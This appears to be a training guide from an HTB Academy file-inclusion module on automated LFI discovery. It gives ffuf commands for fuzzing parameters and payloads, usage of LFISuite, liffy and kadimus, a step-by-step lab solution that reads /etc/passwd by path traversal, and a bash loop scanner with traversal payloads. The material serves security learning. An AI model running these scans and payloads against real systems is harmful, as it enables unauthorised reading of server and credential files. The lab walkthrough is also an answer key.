# Automated Scanning & Tools - HTB Academy Guide

## Overview

Automated tools and techniques for discovering LFI vulnerabilities and escalating them efficiently across large applications and networks.

---

## Parameter Discovery & Fuzzing

### Hidden GET/POST Parameter Discovery

**Using ffuf for Parameter Fuzzing:**
```bash
# Discover hidden GET parameters
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u "http://target.com/index.php?FUZZ=test" \
     -mc 200 \
     -fs 0

# Discover POST parameters
ffuf -w burp-parameter-names.txt:FUZZ \
     -X POST \
     -d "FUZZ=test" \
     -u "http://target.com/index.php" \
     -mc 200
```

**HTB Academy Lab Example:**
```bash
# Target: 83.136.254.199:58743
# Discovery phase
ffuf -w burp-parameter-names.txt:FUZZ \
     -u "http://83.136.254.199:58743/index.php?FUZZ=test" \
     -mc 200 -fs 1935

# Results show parameter with different response size
```

---

## LFI Wordlist Fuzzing

### Comprehensive LFI Testing

**Basic LFI Fuzzing:**
```bash
# Test common LFI payloads
ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
     -u "http://target.com/index.php?file=FUZZ" \
     -mc 200

# Linux-specific payloads
ffuf -w LFI-gracefulsecurity-linux.txt:FUZZ \
     -u "http://target.com/lfi.php?page=FUZZ" \
     -mc 200
```

**Multi-Stage Discovery:**
```bash
# Stage 1: Baseline response size
ffuf -w lfi-payloads.txt:FUZZ \
     -u "http://target.com/lfi.php?file=FUZZ" \
     -mc 200 -fs 1337

# Stage 2: Filter successful hits
ffuf -w successful-payloads.txt:FUZZ \
     -u "http://target.com/lfi.php?file=FUZZ" \
     -mc 200 -fs 1337,1935
```

---

## Server File Discovery

### Webroot and Configuration File Discovery

**Common Configuration Files:**
```bash
# Apache configurations
ffuf -w apache-configs.txt:FUZZ \
     -u "http://target.com/lfi.php?file=FUZZ"

# PHP configuration discovery
ffuf -w php-configs.txt:FUZZ \
     -u "http://target.com/lfi.php?file=../../../../FUZZ"
```

---

## Automated LFI Tools

### Professional LFI Exploitation Tools

**LFISuite:**
```bash
# Installation
git clone https://github.com/D35m0nd142/LFISuite.git
cd LFISuite
python3 lfisuite.py

# Usage
python3 lfisuite.py -u "http://target.com/lfi.php?file=" -l linux
```

**liffy:**
```bash
# Advanced LFI exploitation framework
git clone https://github.com/hvqzao/liffy.git
python3 liffy.py -U "http://target.com/lfi.php?file=FUZZ"
```

**kadimus:**
```bash
# LFI/RFI scanner and exploiter
kadimus -u "http://target.com/lfi.php?file=" -A
```

---

## HTB Academy Automated Scanning Lab

### Complete 4-Stage Solution

**Target:** 83.136.254.199:58743  
**Objective:** Use automated tools to find parameters, test LFI, and extract flag

**Stage 1: Parameter Discovery**
```bash
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ \
     -u "http://83.136.254.199:58743/index.php?FUZZ=test" \
     -mc 200 -fs 1935

# Result: 'language' parameter found (different response size)
```

**Stage 2: LFI Payload Testing**
```bash
ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ \
     -u "http://83.136.254.199:58743/index.php?language=FUZZ" \
     -mc 200 -fs 1935

# Result: Multiple successful payloads with response size != 1935
```

**Stage 3: Filter and Identify Working Payloads**
```bash
# Focus on payloads that returned different response sizes
# Test specific payload manually
curl -s "http://83.136.254.199:58743/index.php?language=../../../../etc/passwd" | wc -c
```

**Stage 4: Flag Extraction**
```bash
# Use working payload to find and read flag
ffuf -w common-flag-locations.txt:FUZZ \
     -u "http://83.136.254.199:58743/index.php?language=FUZZ" \
     -mc 200 -fs 1935
```

---

## Custom Automation Scripts

### Advanced Fuzzing Techniques

**Multi-Parameter Testing:**
```bash
# Create custom script for complex testing
cat << 'EOF' > lfi_scanner.sh
#!/bin/bash
TARGET=$1
PARAMS=("file" "page" "include" "path" "dir" "lang" "language")
PAYLOADS=("../../../../etc/passwd" "....//....//etc/passwd" "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd")

for param in "${PARAMS[@]}"; do
    for payload in "${PAYLOADS[@]}"; do
        echo "Testing: $param = $payload"
        curl -s "$TARGET?$param=$payload" | grep -q "root:" && echo "SUCCESS!"
    done
done
EOF
chmod +x lfi_scanner.sh
```

---

*[Content continues with more tools and techniques...]*

*This guide covers automated scanning techniques from HTB Academy's File Inclusion module.* 